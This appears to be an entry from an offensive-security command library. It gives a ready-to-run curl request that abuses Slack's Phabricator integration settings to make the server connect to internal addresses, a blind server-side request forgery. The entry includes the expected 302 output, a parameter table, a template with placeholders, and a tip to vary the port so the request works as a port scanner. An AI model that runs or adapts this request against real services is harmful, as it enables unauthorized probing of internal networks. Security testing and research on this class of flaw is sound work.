---
data: >-
  curl -X POST https://agarri.slack.com/services/4836378801 -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "edit_service=1&edit_label=1&phabricator_url=http://[::]:22/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
tags:
  - ssrf
  - phabricator
  - config
type: command
output: |-
  HTTP/1.1 302 Found
  Location: /services/4836378801?updated=1
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.346Z'
id: 71123fcd-1bf2-477c-9c8c-9f9f9ae22081
verified: false
validated: true
submitted: true
---
# configure-phabricator-ssrf-integration-open-port

## Command

```bash
curl -X POST https://agarri.slack.com/services/4836378801 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "edit_service=1&edit_label=1&phabricator_url=http://[::]:22/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
```

## Description

Configures Phabricator integration URL to IPv6 loopback on open port 22, triggering blind SSRF validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `phabricator_url` | URL with port, e.g., http://[::]:22/ | Yes |
| `conduit_user` | Dummy user | Yes |
| `conduit_cert` | Dummy cert | Yes |
| `import_phriction` | Enable import (1) | Yes |
| `edit_service` | Edit flag (1) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://your-slack.com/services/ID \
  -d "phabricator_url=http://[::]:22/&conduit_user=test&..."
```

### Advanced Usage

Vary port for scanning.

## Expected Output

302 redirect indicating successful config and open port.

## Related

- [[commands/configure-phabricator-ssrf-integration-closed-port]]
- [[procedures/Configure-Phabricator-Integration-for-Blind-SSRF]]
